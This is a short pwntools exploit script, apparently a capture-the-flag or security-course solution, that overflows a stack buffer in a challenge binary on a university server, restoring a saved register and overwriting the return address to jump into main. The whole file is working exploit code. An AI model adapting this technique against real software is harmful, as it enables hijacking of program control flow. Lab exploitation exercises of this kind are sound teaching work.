#!/bin/python3.11
from pwn import *

elf = ELF('./bin')
# S = process('./bin')
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 9995)

buffer = 0xffffcdc0

eip = 0xffffcddc

ebxSaved = 0x804a000 + 1 # Strcpy will end if it finds a null byte, so we need to change the first byte of the saved ebx to a non-null byte

offset = eip - buffer

jmpInMain = 0x080486f4




# payload = b"A" * offset + p32(func)
payload = b"A" * (offset - 8) + p32(ebxSaved) + b"A"*4 + p32(jmpInMain)

S.sendline(payload)

print(S.recvall())